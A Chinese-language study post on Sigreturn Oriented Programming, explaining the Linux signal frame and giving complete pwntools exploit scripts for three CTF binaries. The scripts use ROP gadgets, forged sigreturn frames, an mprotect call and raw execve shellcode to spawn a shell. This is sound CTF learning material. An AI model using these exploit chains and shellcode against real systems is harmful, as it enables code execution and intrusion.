---
title: SROP-study
abbrlink: 59104
date: 2018-11-04 13:11:27
tags:
---

# SROP

## pwnable.kr-unexploitable

SROP:

可以用来控制所有的寄存器，进行stack pivot。

Sigreturn Oriented Programming (SROP)，这个方法是用来攻击POSIX主机的信号处理机制的。

Linux系统上，Signal本质上是对`中断机制的模拟`，Signal的来源主要有以下途径：

1. 硬件来源：按下键盘或者其他故障
2. 软件来源: `kill`等；非法操作

接收到Single之后，流程如下:

```
  +---------+             +---------+             +---------+
    | Process |             | Handler |             | Process |
    +---------+             +---------+             +---------+
        |                       ^   |                   ^
User    |                       |   |                   |
-----------------------------------------------------------------------
Kenerl  |                       |   |                   |
        |       +---------+     |   |   +---------+     |
        +------>|  Save   |-----+   +-->| Restore |-----+
                +---------+             +---------+
```

1. 进入内核态
2. 保存上下文
3. 回到用户态执行相关信号处理函数
4. 进入内核态恢复上下文
5. 进程继续执行

在程序接受Signal后，内核将进程的上下文`context(r8-r15, rax, rbx, rcx, rdx, rdi, rsi等)`保存在`栈`上，称作`Signal Frame`；当进程收到`rt_sigreturn`会从栈上取`Signal Frame`用来恢复进程的上下文。

```
                    Signal Frame
+-------------------------+-------------------------+
|        rt_sigreturn     |         uc_flags        |
+-------------------------+-------------------------+
|          &uc            |       uc_stack.ss_sp    |
+-------------------------+-------------------------+
|    uc_stack.ss_flags    |    uc_stack.ss_size     |
+-------------------------+-------------------------+
|          r8             |           r9            |
+-------------------------+-------------------------+
|          r10            |           r11           |
+-------------------------+-------------------------+
|          r12            |           r13           |
+-------------------------+-------------------------+
|          r14            |           r15           |
+-------------------------+-------------------------+
|          rdi            |           rsi           |
+-------------------------+-------------------------+
|          rbp            |           rbx           |
+-------------------------+-------------------------+
|          rdx            |           rax           |
+-------------------------+-------------------------+
|          rcx            |           rsp           |
+-------------------------+-------------------------+
|          rip            |           eflags        |
+-------------------------+-------------------------+
|        cs/gs/fs         |           err           |
+-------------------------+-------------------------+
|         trapno          |         oldmask         |
+-------------------------+-------------------------+
|          cr2            |          %fpstate       |
+-------------------------+-------------------------+
|       __reserved        |         sigmask         |
+-------------------------+-------------------------+
```

所以，可选的攻击方式就是构造一个`fake signal frame`写入内存中，将然后将`RSP`指向这段空间，再发送`rt_sigreturn`信号。此时，内核会将构造好的`fake signal frame`取出，恢复。恢复后类似于ROP的方式，为syscall调用`execve`。

### SROP(自主组装sig_frame):

```
from pwn import *
io = remote("127.0.0.1", 10001)
elf = ELF("./unexploitable")
bss_base = 0x0000000000601028 + 0x100
sig_stage = bss_base + 0x400
syscall_addr = 0x00400560
pop_rbp_ret = 0x00400512#: pop rbp ; ret  ;  (1 found)
leave_ret = 0x00400576#: leave  ; ret  ;  (1 found)
part1 = 0x004005e6#: mov rbx, qword [rsp+0x08] ; mov rbp, qword [rsp+0x10] ; mov r12, qword [rsp+0x18] ; mov r13, qword      [rsp+0x20] ; mov r14, qword [rsp+0x28] ; mov r15, qword [rsp+0x30] ; add rsp, 0x38 ; ret  ;  (1 found)
part2 = 0x004005d0#: mov rdx, r15 ; mov rsi, r14 ; mov edi, r13d ; call qword [r12+rbx*8] ;  (1 found)
def call_function(call_addr, arg1, arg2, arg3):
    payload = ""
    payload += p64(part1)       # => RSP
    payload += "A" * 8
    payload += p64(0)           # => RBX
    payload += p64(1)           # => RBP
    payload += p64(call_addr)   # => R12 => RIP
    payload += p64(arg1)        # => R13 => RDI
    payload += p64(arg2)        # => R14 => RSI
    payload += p64(arg3)        # => R16 => RDX
    payload += p64(part2)
    payload += "C" * 0x38
    return payload

sig_frame  = ""
sig_frame += p64(syscall_addr) + p64(0)
sig_frame += p64(0) + p64(0)
sig_frame += p64(0) + p64(0)
sig_frame += p64(0) + p64(0)            # r8 r9
sig_frame += p64(0) + p64(0)            # r10 r11
sig_frame += p64(0) + p64(0)            # r12 r13
sig_frame += p64(0) + p64(0)            # r14 r15
sig_frame += p64(bss_base+0x200) + p64(0)   # rdi rsi
sig_frame += p64(0) + p64(0)            # rbp rbx
sig_frame += p64(0) + p64(59)           # rdx rax(execve)
sig_frame += p64(0) + p64(0)            # rcx rsp
sig_frame += p64(syscall_addr) + p64(0x207) # rip eflags
sig_frame += p64(0x33) + p64(0)         # cs/gs/fs err
sig_frame += p64(0) + p64(0)            # trapno oldmask
sig_frame += p64(0) + p64(0)            # cr2 &fpstate
sig_frame += p64(0) + p64(0)            # __reserved sigmask

payload1  = "A" * 0x10
payload1 += p64(bss_base)
payload1 += call_function(elf.got["read"], 0, bss_base, 0x300)
payload1 += p64(pop_rbp_ret)
payload1 += p64(bss_base)
payload1 += p64(leave_ret)
payload2  = p64(bss_base+0x8)
payload2 += call_function(elf.got["read"], 0, sig_stage, 0x100)
payload2 += sig_frame
payload2  = payload2.ljust(0x200, "\x00")
payload2 += "/bin/sh\x00"
payload3  = "D" * 0xf

sleep(3)
raw_input()
io.send(payload1)
raw_input()
io.send(payload2)
raw_input()
io.send(payload3)
io.interactive()
```

### SROP(调用SigreturnFrame())

```
#!/usr/bin/python
#coding:utf-8

from pwn import *

context.update(os = 'linux', arch = 'amd64')
context.log_level ="debug"
syscall_addr = 0x400560
set_read_addr = 0x40055b
read_addr = 0x400571
fake_stack_addr = 0x60116c
fake_ebp_addr = 0x60116c
binsh_addr = 0x60115c

#io = remote('172.17.0.3', 10001)
io = process("./unexploitable")
payload = ""
payload += 'a'*16				#padding
payload += p64(fake_stack_addr)	
payload += p64(set_read_addr)	#lea rax, [rbp+buf]; mov edx, 50Fh; mov rsi, rax; mov edi, 0; mov eax, 0; call _read
sleep(3)
io.send(payload)

frameExecve = SigreturnFrame()				#SROP Frame
frameExecve.rax = constants.SYS_execve
frameExecve.rdi = binsh_addr
frameExecve.rsi = 0
frameExecve.rdx = 0
frameExecve.rip = syscall_addr

payload = ""
payload += "/bin/sh\x00"				                 # 5c
payload += 'a'*8						#padding
payload += p64(fake_stack_addr+0x10)	                 # 6c
payload += p64(read_addr)				
payload += p64(fake_ebp_addr)           # p64(0) is ok too	7c		
payload += p64(syscall_addr)			                    
payload += str(frameExecve)				#SigreturnFrame   8c
io.send(payload)
sleep(1)
gdb.attach(io)
io.send("/bin/sh\x00" + ('a')*7)		
io.interactive()

```

### ROP

```
from pwn import *

io = process("./unexploitable")
elf = ELF("./unexploitable")
#context.log_level = "debug"

pop_rbp = 0x400512
leave_ret = 0x400576
syscall_addr = 0x400560
bss_addr = 0x601028 + 0x200
sh_addr = 0x601028 + 0x400
# rdi, rsi, rdx, rcx, r8, r9
 
gadget_1 = 0x4005e6
"""
   0x00000000004005e6 <+102>:   mov    rbx,QWORD PTR [rsp+0x8]
   0x00000000004005eb <+107>:   mov    rbp,QWORD PTR [rsp+0x10]
   0x00000000004005f0 <+112>:   mov    r12,QWORD PTR [rsp+0x18]
   0x00000000004005f5 <+117>:   mov    r13,QWORD PTR [rsp+0x20]
   0x00000000004005fa <+122>:   mov    r14,QWORD PTR [rsp+0x28]
   0x00000000004005ff <+127>:   mov    r15,QWORD PTR [rsp+0x30]
   0x0000000000400604 <+132>:   add    rsp,0x38
   0x0000000000400608 <+136>:   ret 
"""
 
gadget_2 = 0x4005d0
"""
   0x00000000004005d0 <+80>:    mov    rdx,r15
   0x00000000004005d3 <+83>:    mov    rsi,r14
   0x00000000004005d6 <+86>:    mov    edi,r13d
   0x00000000004005d9 <+89>:    call   QWORD PTR [r12+rbx*8]
"""
 
def call_function(call_addr, arg1, arg2, arg3):
    payload = ""
    payload += p64(gadget_1)    # => rsp
    payload += "A" * 8
    payload += p64(0)           # => rbx
    payload += p64(1)           # => 1
    payload += p64(call_addr)   # => r12 => call addr
    payload += p64(arg1)        # => r13 => edi => rdi
    payload += p64(arg2)        # => r14 => rsi
    payload += p64(arg3)        # => r15 => rdx
    payload += p64(gadget_2)    # => rsp + 38
    payload += "C" * 0x38
    return payload
    
# use read to set rax as 0x59
payload1 = "A" * 0x10 + p64(bss_addr) # "A" * 0x10 + p64(0) is ok too
payload1 += call_function(elf.got['read'], 0, bss_addr, 0x200)
payload1 += p64(pop_rbp)
payload1 += p64(bss_addr)
payload1 += p64(leave_ret)

payload2 = p64(bss_addr + 0x8)       # p64(0x0)  is ok too
payload2 += call_function(elf.got["read"], 0, sh_addr, 0x200)
payload2 += call_function(sh_addr+0x10, sh_addr, 0, 0)
print len(payload2)
payload3 = "/bin/sh\x00".ljust(0x10, "B")
payload3 += p64(syscall_addr)
payload3 = payload3.ljust(59, "D")

sleep(3)
io.send(payload1)

io.send(payload2)
io.send(payload3)
io.interactive()

```

## 360/ichunqiu smallest

```
.text:00000000004000B0 start           proc near               ; DATA XREF: LOAD:00000000004000180
.text:00000000004000B0                 xor     rax, rax
.text:00000000004000B3                 mov     edx, 400h       ; count
.text:00000000004000B8                 mov     rsi, rsp        ; buf
.text:00000000004000BB                 mov     rdi, rax        ; fd
.text:00000000004000BE                 syscall                 ; LINUX - sys_read
```

srop + mprotect + shellcode

```
# -*-coding:utf-8-*-
__author__ = 'joker'

from pwn import *
context.log_level = "debug"
context.arch = "amd64"

r = process("./smallest")

syscall_addr = 0x4000BE
start_addr = 0x4000B0

# leak ebp
payload = p64(start_addr)
payload += p64(0x4000b3) #fill
payload += p64(start_addr) #fill
r.send(payload)

raw_input("joker")
gdb.attach(r)
#write infor leak
r.send("\xb3")#write 2 start_addr last byte
data = r.recv(8)
data = r.recv(8)
stack_addr = u64(data)

print hex(stack_addr)

# srop
frame = SigreturnFrame()
frame.rax = constants.SYS_read
frame.rdi = 0
frame.rsi = stack_addr
frame.rdx = 0x300
frame.rsp = stack_addr
frame.rip = syscall_addr

payload = p64(start_addr)
payload += p64(syscall_addr)
payload += str(frame)
r.send(payload)

raw_input("joker")
payload = p64(0x4000B3)#fill
payload += p64(0x400000)#fill    # 0x4000XX
payload = payload[:15]
r.send(payload)#set rax=sys_rt_sigreturn

frame = SigreturnFrame()
frame.rax = constants.SYS_mprotect
frame.rdi = (stack_addr&0xfffffffffffff000)
frame.rsi = 0x1000
frame.rdx = 0x7
frame.rsp = stack_addr + 0x108
frame.rip = syscall_addr
payload = p64(start_addr)
payload += p64(syscall_addr)
payload += str(frame)
print "length:", len(payload)
payload += p64(stack_addr + 0x108 + 8)
#payload += cyclic(0x100)#addr ====> start_addr + 0x108
payload += "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"#shellcode

r.send(payload)

raw_input("joker")
payload = p64(0x4000B3)#fill
payload += p64(0x400000)#fill
payload = payload[:15]
r.send(payload)#set rax=sys_rt_sigreturn

r.interactive()
```

srop + execve

```
# -*-coding:utf-8-*-
__author__ = 'joker'

from pwn import *
#context.log_level = "debug"
context.arch = "amd64"

r = process("./smallest")

syscall_addr = 0x4000BE
start_addr = 0x4000B0

# leak ebp
payload = p64(start_addr)
payload += p64(0x4000b3) #fill
payload += p64(start_addr) #fill
r.send(payload)

raw_input("joker")
#write infor leak
r.send("\xb3")#write 2 start_addr last byte
data = r.recv(8)
data = r.recv(8)
stack_addr = u64(data)

print hex(stack_addr)

# srop
frame = SigreturnFrame()
frame.rax = constants.SYS_read
frame.rdi = 0
frame.rsi = stack_addr
frame.rdx = 0x300
frame.rsp = stack_addr
frame.rip = syscall_addr # After sigreturn, the rip will be the one just behind the syscall_addr
print str(frame)
payload = p64(start_addr)
payload += p64(syscall_addr)     # block1
payload += str(frame)
r.send(payload)

raw_input("joker")
payload = p64(0x4000B3) # 填充 block1,0x4000B3 and 0x4000BE is both ok,they will all call "syscall"
payload += "abcdefgh" # fill    # 0x4000XX
payload = payload[:15]
r.send(payload)#set rax=sys_rt_sigreturn

frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = stack_addr + 0x108# sh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_addr
payload = p64(start_addr)
payload += p64(syscall_addr)      # block2
payload += str(frame)
payload += "/bin/sh\x00"
print "length:", len(payload)
#payload += cyclic(0x100)#addr ====> start_addr + 0x108

r.send(payload)

raw_input("joker")
payload = p64(0x4000B3) #fill block2
payload += "abcdefgh" #fill everything is ok, just used to fill 15 byte
payload = payload[:15]
r.send(payload)#set rax=sys_rt_sigreturn

r.interactive()
```

## Backdoor CTF

```
shellcode:0000000010000000 _shellcode      segment byte public 'CODE' use64
.shellcode:0000000010000000                 assume cs:_shellcode
.shellcode:0000000010000000                 ;org 10000000h
.shellcode:0000000010000000                 assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing
.shellcode:0000000010000000
.shellcode:0000000010000000                 public _start
.shellcode:0000000010000000 _start:                                 ; Alternative name is '_start'
.shellcode:0000000010000000                 xor     eax, eax        ; __start
.shellcode:0000000010000002                 xor     edi, edi
.shellcode:0000000010000004                 xor     edx, edx
.shellcode:0000000010000006                 mov     dh, 4
.shellcode:0000000010000008                 mov     rsi, rsp
.shellcode:000000001000000B                 syscall                 ; LINUX - sys_read
.shellcode:000000001000000D                 xor     edi, edi
.shellcode:000000001000000F                 push    0Fh
.shellcode:0000000010000011                 pop     rax
.shellcode:0000000010000012                 syscall                 ; LINUX - sys_rt_sigreturn
.shellcode:0000000010000014                 int     3               ; Trap to Debugger
.shellcode:0000000010000015
.shellcode:0000000010000015 syscall:                                ; LINUX -
.shellcode:0000000010000015                 syscall
.shellcode:0000000010000017                 xor     rdi, rdi
.shellcode:000000001000001A                 mov     rax, 3Ch
.shellcode:0000000010000021                 syscall                 ; LINUX - sys_exit
.shellcode:0000000010000021 ; ---------------------------------------------------------------------------
.shellcode:0000000010000023 flag            db 'fake_flag_here_as_original_is_at_server',0
.shellcode:0000000010000023 _shellcode      ends
```

srop + execve:

```
#!/usr/bin/python
#coding:utf-8

from pwn import *

context.update(os = 'linux', arch = 'amd64')

syscall_addr = 0x1000000B
new_rsp_addr = 0x10000058
sigreturn_addr = 0x10000010d

#io = remote('172.17.0.3', 10001)
io = process("./funsignals")
frameRead = SigreturnFrame()			#构造read的SROP栈，使用read读取后续代码到新栈，同时劫持rsp
frameRead.rax = constants.SYS_read
frameRead.rdi = 0
frameRead.rsi = new_rsp_addr
frameRead.rdx = 0x1000
frameRead.rsp = new_rsp_addr
frameRead.rip = syscall_addr     # after sigreturn ,the rip will be the one just behind syscall_addr 0x100000D

payload = str(frameRead)

io.send(payload)
sleep(3)
attach(io)

frameExecve = SigreturnFrame()			#新栈内容，sigreturn的实现为push 0xf; pop rax; syscall，所以"/bin/sh\x00"放在最后。SROP帧第一个寄存器为uc_flag，不会影响SYS_execve调用
frameExecve.rax = constants.SYS_execve
frameExecve.rdi = new_rsp_addr+len(str(frameRead))
frameExecve.rsi = 0
frameExecve.rdx = 0
frameExecve.rip = syscall_addr

payload = str(frameExecve)
payload += "/bin/sh\x00"
io.send(payload)
sleep(3)
io.interactive()
```



